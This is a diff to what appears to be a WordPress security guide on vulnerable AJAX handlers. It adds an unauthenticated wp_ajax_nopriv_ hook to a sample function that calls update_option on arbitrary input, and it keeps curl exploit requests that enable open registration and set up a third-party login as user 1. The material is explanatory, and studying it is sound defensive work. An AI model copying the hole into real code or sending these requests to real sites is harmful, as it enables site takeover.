@@ -21,7 +21,7 @@ To update an option, the [`update_option`](https://developer.wordpress.org/refer
 Example of vulnerable code:
 
 ```php
-add_action("wp_ajax_update_site_preference", "update_site_preference");
+add_action("wp_ajax_nopriv_update_site_preference", "update_site_preference");
 
 function update_site_preference(){
     if(empty($_POST['key']) || empty($_POST['value'])){
@@ -35,7 +35,7 @@ function update_site_preference(){
 }
 ```
 
-To exploit this, any authenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_option` function.
+To exploit this, any unauthenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `update_option` function.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=update_site_preference -d "key=users_can_register&value=1"
@@ -252,7 +252,7 @@ function login_third_party(){
 }
 ```
 
-To exploit this, any unauthenticated user just needs to perform a POST request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `configure_platform_callback` function and then the `login_third_party` function.
+To exploit this, any unauthenticated user just needs to perform a POST and GET request to the `admin-ajax.php` endpoint specifying the needed action and parameter to trigger the `configure_platform_callback` function and then the `login_third_party` function.
 
 ```bash
 curl <WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=configure_platform_callback -d "user_id=1&fbid=1337"
